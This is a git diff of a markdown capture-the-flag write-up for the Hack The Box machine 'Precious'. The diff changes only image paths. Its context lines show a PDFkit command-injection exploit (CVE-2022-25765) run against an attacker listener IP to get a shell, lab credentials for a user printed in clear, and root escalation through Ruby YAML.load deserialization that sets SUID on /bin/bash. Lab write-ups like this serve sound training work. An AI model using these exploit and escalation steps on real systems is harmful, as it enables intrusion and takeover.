@@ -4,7 +4,7 @@ icon: ubuntu
 
 # Precious - Easy
 
-<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/precious"><strong>Precious</strong></a></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/precious"><strong>Precious</strong></a></p></figcaption></figure>
 
 ## <mark style="color:$success;">Scanning & Enumeration</mark>
 
@@ -74,23 +74,23 @@ I tried searching for an exploit for Phusion Passenger(R) 6.0.15 but nothing cam
 
 #### <mark style="color:$primary;">Website</mark>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I am going to create an empty html file and serve it to the site.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's check the pdf file we got back
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 We got a version of the underlying technology doing the conversion
 
 A quick googl search reveals an POC Exploit on Github&#x20;
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">PDFkit-CMD-Injection <= 0.8.6 - (CVE-2022-25765)</mark>
 
@@ -102,7 +102,7 @@ python CVE-2022-25765.py -t http://precious.htb/ -a 10.10.16.63 -p 443
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:$success;">Post Exploitation</mark>
 
@@ -110,7 +110,7 @@ python CVE-2022-25765.py -t http://precious.htb/ -a 10.10.16.63 -p 443
 
 ### <mark style="color:$primary;">Manual Enumeration -> Hardcoded Creds</mark>
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Doing some manual Enumeration I discovered that ruby had its own home directory. I saw an interesting .bundle folder with a config file inside. That config file contained henry's creds!
 
@@ -122,11 +122,11 @@ henry:Q3c1AqGHtoI0aXAYFH
 
 ### <mark style="color:blue;">Shell as henry</mark>
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">Universal RCE with Ruby YAML.load</mark>
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 henry can run ruby on a script as the root user. Let's check out the script
 
@@ -167,11 +167,11 @@ end
 
 The script is trying to load a .yml file
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 However the .yml file i missing fom the `/opt` directory
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 When trying to run it without the .yml file it is complaining that its missing.
 
@@ -206,7 +206,7 @@ I am going to use this script and modify it so that it adds the SUID to /bin/bas
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 Save the script to a file,then run&#x20;
 
@@ -216,4 +216,4 @@ sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
